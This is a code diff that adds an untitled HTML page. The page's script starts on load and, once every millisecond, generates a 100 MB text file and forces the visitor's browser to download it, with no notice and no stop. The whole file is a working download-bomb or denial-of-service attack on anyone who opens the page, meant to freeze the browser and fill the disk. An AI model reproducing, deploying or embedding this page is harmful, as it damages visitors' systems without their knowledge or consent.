@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+</head>
+<body>
+ 
+  <div id="log"></div>
+
+  <script>
+    let fileCounter = 0;
+
+    // Function to create and trigger download of file
+    function createAndDownloadFile() {
+      fileCounter++;
+      const filename = `file_${fileCounter}.txt`;
+      const content = 'A'.repeat(100 * 1024 * 1024); // 100 MB text content
+
+      // Creating a Blob object
+      const blob = new Blob([content], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = filename;
+
+      // Triggering the download
+      link.click();
+
+      // Log progress
+      const log = document.getElementById('log');
+      log.textContent = `File ${filename} created. It will be downloaded shortly.`;
+    }
+
+    // Start file generation immediately at 1 ms interval
+    const intervalId = setInterval(() => {
+      createAndDownloadFile();
+    }, 1);
+  </script>
+</body>
+</html>
